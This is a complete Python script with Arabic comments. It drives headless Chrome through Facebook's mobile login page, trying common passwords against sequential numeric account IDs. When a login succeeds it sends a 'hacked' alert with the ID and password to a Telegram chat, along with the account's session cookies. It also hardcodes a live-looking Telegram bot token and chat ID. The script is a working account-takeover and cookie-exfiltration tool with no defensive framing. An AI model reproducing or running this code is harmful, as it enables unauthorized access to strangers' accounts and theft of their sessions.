import telebot
import time
import os
import random
import json
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

# إعدادات البوت
TOKEN = "7665591962:AAFIIe-izSG4rd71Kruf0xmXM9j11IYdHvc"
CHAT_ID = "1879021873"
bot = telebot.TeleBot(TOKEN)

# كلمات السر (مقلصة لزيادة سرعة الفحص الأولي)
PASSWORDS = ["123456", "123456789", "12345678", "12345", "password", "1234567", "123123", "112233", "000000", "jasser", "vodka"]

def run_scanner():
    # إرسال رسالة فورية عند تشغيل السكربت على السيرفر
    try:
        bot.send_message(CHAT_ID, "✅ تم إقلاع السكربت بنجاح على سيرفرات GitHub.\n🚀 بدأ الفحص من المعرف: 1430771423")
    except Exception as e:
        print(f"Telegram Error: {e}")

    current_id = 1430771423
    
    while True:
        # إشعار كل 5 معرفات للتأكد من الحالة
        if current_id % 5 == 0:
            try: bot.send_message(CHAT_ID, f"📡 السكربت لا يزال يعمل.. واصل لفحص: {current_id}")
            except: pass
            
        for password in PASSWORDS:
            print(f"Checking: {current_id} Pass: {password}")
            opts = Options()
            opts.add_argument("--headless")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument(f'user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1')
            
            driver = webdriver.Chrome(options=opts)
            try:
                driver.get("https://m.facebook.com/login/")
                time.sleep(3)
                driver.find_element(By.NAME, "email").send_keys(str(current_id))
                driver.find_element(By.NAME, "pass").send_keys(password)
                driver.execute_script("document.querySelector('button[name=\"login\"]').click();")
                time.sleep(10)
                
                all_cookies = driver.get_cookies()
                if any(c['name'] == 'c_user' for c in all_cookies):
                    bot.send_message(CHAT_ID, f"🔥 تم الاختراق!\n🆔 {current_id}\n🔑 {password}")
                    with open(f"{current_id}.json", "w") as f: json.dump(all_cookies, f)
                    with open(f"{current_id}.json", "rb") as f: bot.send_document(CHAT_ID, f)
                    os.remove(f"{current_id}.json")
                    break
            except: pass
            finally: driver.quit()
        
        current_id += 1
        time.sleep(1)

if __name__ == "__main__":
    run_scanner()
